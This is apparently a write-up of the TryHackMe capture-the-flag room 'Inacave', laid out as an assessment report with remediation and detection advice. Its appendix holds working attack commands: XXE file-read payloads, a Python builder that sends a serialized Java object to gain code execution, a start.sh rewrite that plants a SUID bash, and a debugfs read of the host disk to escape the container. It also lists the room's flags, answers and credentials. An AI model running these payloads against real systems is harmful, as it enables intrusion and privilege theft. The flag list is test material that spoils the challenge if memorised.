# Security Assessment Report: Inacave

## Assessment Overview
- **Platform:** TryHackMe
- **Target:** 10.129.175.29
- **Room Type:** CTF (Insane) — XXE, Java Deserialization, Docker Escape
- **Date Solved:** 2026-04-22

**Objectives & Status:**
- [x] What was the weird thing carved on the door? → `^ed[h#f]{3}[123]{1,2}xf[!@#*]$`
- [x] What weapon you used to defeat the skeleton? → `bone-breaking-war-hammer`
- [x] What is the cave flag? → `THM{no_wall_can_stop_me}`
- [x] What is the outside flag? → `THM{digging_down_then_digging_up}`

---

## Executive Summary & Key Findings

A Docker-hosted cave RPG application was compromised through a chained attack: XXE on the web endpoint leaked source code revealing an insecure Java deserialization endpoint on port 3333, which provided RCE as the `cave` user. Horizontal movement through the RPG narrative (door password brute-force, GPG decryption, skeleton binary) escalated to `skeleton` with `sudo /bin/kill`. Writable PID-1 start script + killing a child process yielded root inside the container. The privileged container configuration (all capabilities, no seccomp) then enabled a Docker escape via `debugfs` on the host block device.

- **Exposed Services:** Apache/2.4.41 (80/tcp), OpenSSH 8.2p1 (2222/tcp), Custom Java RPG (3333/tcp)
- **Interesting Paths:** `/action.php` (XXE), `adventurer.cave.thm/adventurer.priv` (GPG key), `/home/door/skeleton` (setuid binary), `/root/start.sh` (writable PID-1 script), `/dev/xvda2` (host block device)
- **Credentials Discovered:**
  - `door:edfh#22xf!` (SSH 2222)
  - `skeleton:sp00kyscaryskeleton` (SSH 2222)
  - GPG passphrase: `breakingbonessince1982`
- **Users Enumerated:** cave (uid 1000), door (uid 1001), skeleton (uid 1002), outside (uid 1000 on host)
- **Loot & Flags:**
  - `THM{no_wall_can_stop_me}` (cave flag — container root)
  - `THM{digging_down_then_digging_up}` (outside flag — host root via Docker escape)
- **Answers/Misc:** Door password regex `^ed[h#f]{3}[123]{1,2}xf[!@#*]$` matches `edfh#22xf!`; weapon is `bone-breaking-war-hammer`

---

## Exploitation Chain

1. **Reconnaissance:** Nmap found ports 80 (Apache), 2222 (SSH), 3333 (Java RPG service). XXE on `action.php` leaked `/etc/passwd` and RPG.java source code.
2. **Initial Access:** Crafted serialized Java `Action` objects with `command=$(shell_cmd)` substitution. Served via `action.php?<action>B64</action>` query string, fetched by RPG on port 3333, deserialized and executed as `cave`.
3. **Privilege Escalation (horizontal):** RCE as cave → brute-force door password from regex → SSH as door → decrypt GPG (get weapon name) → run skeleton binary → SSH as skeleton → write SUID bash payload into `/root/start.sh` → kill PID 59 → SUID bash = container root.
4. **Post-Exploitation (Docker escape):** Privileged container (all caps, no seccomp) exposes `/dev/xvda2` (host disk). `mount` blocked by namespace, but `debugfs /dev/xvda2` reads host ext4 directly without mounting.

---

## Vulnerability Details

### VULN-01: XML External Entity Injection (XXE)
- **Vulnerable Location:** `http://target/action.php` (port 80)
- **Overview:** PHP script loads user XML with `LIBXML_NOENT | LIBXML_DTDLOAD`, enabling file exfiltration via `<!ENTITY xxe SYSTEM "file:///path">`.
- **Impact:** Arbitrary file read on the container — leaked RPG.java source code revealing the deserialization attack surface, `/etc/passwd` for user enumeration, and GPG private keys.
- **Severity:** High
- **Remediation:** Disable `LIBXML_NOENT` and `LIBXML_DTDLOAD`. Validate Content-Type. Use `libxml_disable_entity_loader(true)`.
- **Proof of Impact (Execution):**
  - POST with `Content-Type: application/xml` and `<!ENTITY xxe SYSTEM "file:///home/cave/src/RPG.java">` returned full Java source.
  - Also works via GET query string when POST body is empty.

### VULN-02: Insecure Java Deserialization
- **Vulnerable Location:** RPG.java on port 3333
- **Overview:** Service fetches `http://cave.thm/<user_input>`, reads the response, and deserializes it as an `Action` object without validation. The `action()` method runs `/bin/sh -c "echo <command>"`, enabling shell command substitution.
- **Impact:** Remote code execution as `cave` user. Full container compromise chain initiated from this point.
- **Severity:** Critical
- **Remediation:** Use an allowlist for deserialization (ObjectInputFilter). Never deserialize untrusted input. Replace `Runtime.exec("echo ...")` with parameterized execution.
- **Proof of Impact (Execution):**
  - Crafted serialized `Action` with `command=$(id)` → confirmed `uid=1000(cave)`.
  - Wrote SSH authorized_keys for persistent access.

### VULN-03: Privileged Docker Container
- **Vulnerable Location:** Container runtime configuration
- **Overview:** Container launched with `--privileged` (or equivalent): `CapEff: 0000003fffffffff`, `Seccomp: 0`, all `/dev` devices exposed including host block device `/dev/xvda2`.
- **Impact:** Full host filesystem read via `debugfs`. In production, attacker could mount host disk, chroot, install rootkits, or escape completely.
- **Severity:** Critical
- **Remediation:** Never use `--privileged`. Apply least-privilege capabilities (`--cap-drop ALL --cap-add <needed>`). Enable default seccomp profile. Do not expose host block devices.
- **Proof of Impact (Execution):**
  - `debugfs -R "cat root/info.txt" /dev/xvda2` returned the outside flag from the host.

### VULN-04: Writable PID-1 Script + sudo kill
- **Vulnerable Location:** `/root/start.sh` (0770 skeleton:skeleton), sudoers `(root) NOPASSWD: /bin/kill`
- **Overview:** Skeleton user can write to the script that PID 1 executes. Killing a child process of PID 1 causes the script to continue to the next line, executing attacker-injected commands as root.
- **Impact:** Root access inside the container. SUID bash persistence.
- **Severity:** High
- **Remediation:** Set start.sh ownership to `root:root` with `0644`. Restrict sudoers to specific signals or remove sudo kill entirely.
- **Proof of Impact (Execution):**
  - Injected `cp /bin/bash /home/skeleton/rootbash; chmod u+s ...` into start.sh.
  - `sudo /bin/kill -9 59` killed the `su - cave` child → script continued → SUID bash created.

---

## Senior-Level Lessons Learned & Analysis

### Strategic Takeaways
- **Chained exploits multiply severity.** XXE alone is "information disclosure," but combined with deserialization it becomes RCE. Always map the full chain, not individual vulns.
- **Container privilege is the #1 Docker escape vector.** `--privileged` negates the entire isolation model. `debugfs` reads ext4 without `mount()` — namespace restrictions on mount syscalls don't help.
- **sudo on "harmless" binaries is a ticking bomb.** `sudo kill` seems safe until you realize it can terminate child processes of privileged scripts, causing them to continue past intended boundaries.

### Real-World Context & Defense
- **Threat Landscape:** XXE + deserialization chains appear in Java EE/Spring shops running legacy SOAP or REST APIs with XML payloads. Privileged containers are common in CI/CD pipelines and legacy deployments where "it just works" trumped security.
- **Detection Engineering:** Monitor for: (1) XML payloads with `<!DOCTYPE` or `<!ENTITY` in HTTP request bodies, (2) Java deserialization magic bytes `\xAC\xED\x00\x05` in HTTP responses or network streams, (3) `debugfs` or `mount` invocations inside containers, (4) SUID bash creation. SIEM rules on `type=SYSCALL` for `execve(debugfs)` or `chmod u+s` inside container PIDs.
- **System Hardening:** CIS Docker Benchmark 4.5 (no privileged containers), 4.6 (read-only rootfs), 4.7 (default seccomp). For Java apps: enable JEP 290 serialization filtering. For PHP: set `libxml_disable_entity_loader(true)` and `libxml_use_internal_errors(true)`.

---

## Technical Appendix: Commands Worth Keeping

```bash
# Recon
nmap -sC -sV -p- --min-rate 10000 --max-retries 1 --host-timeout 5m <IP>

# XXE — read local files via action.php
curl -s -X POST http://<IP>/action.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><action>&xxe;</action>'

# XXE — read PHP source with base64 filter (when direct read fails)
curl -s -X POST http://<IP>/action.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/action.php">]><action>&xxe;</action>'

# Java Deserialization RCE via port 3333
# Build serialized Action with Python, then send:
python3 -c "
import struct, base64, urllib.parse
def build_action(cmd):
    data  = b'\xAC\xED\x00\x05\x73\x72\x00\x06\x41\x63\x74\x69\x6F\x6E'
    data += b'\xF9\xBC\x4D\xEE\x80\x1F\x19\x3B\x02\x00\x03'
    data += b'\x4C\x00\x07\x63\x6F\x6D\x6D\x61\x6E\x64'
    data += b'\x74\x00\x12\x4C\x6A\x61\x76\x61\x2F\x6C\x61\x6E\x67\x2F\x53\x74\x72\x69\x6E\x67\x3B'
    data += b'\x4C\x00\x04\x6E\x61\x6D\x65\x71\x00\x7E\x00\x01'
    data += b'\x4C\x00\x06\x6F\x75\x74\x70\x75\x74\x71\x00\x7E\x00\x01\x78\x70'
    for s in [cmd, 'x', '']:
        b = s.encode(); data += b'\x74' + struct.pack('>H', len(b)) + b
    return base64.b64encode(data).decode()
b64 = build_action('\$(id)')
enc = urllib.parse.quote(b64, safe='')
print(f'action.php?%3Caction%3E{enc}%3C%2Faction%3E')
" | nc -w 5 <IP> 3333

# GPG decrypt with expired key
echo "breakingbonessince1982" | gpg --pinentry-mode loopback --batch \
  --passphrase-fd 0 --trust-model always --decrypt oldman.gpg

# Skeleton binary with inventory
INVENTORY=lamp:bone-breaking-war-hammer ./skeleton

# Privilege Escalation — modify start.sh + kill child process
cat > /root/start.sh << 'EOF'
#!/bin/bash
cp /bin/bash /home/skeleton/rootbash
chmod u+s /home/skeleton/rootbash
service ssh start
service apache2 start
su - cave -c "cd /home/cave/src; ./run.sh"
EOF
sudo /bin/kill -9 <PID_of_su_child>

# Docker Escape — read host filesystem via debugfs
/home/skeleton/rootbash -p -c "debugfs -R 'cat root/info.txt' /dev/xvda2"
```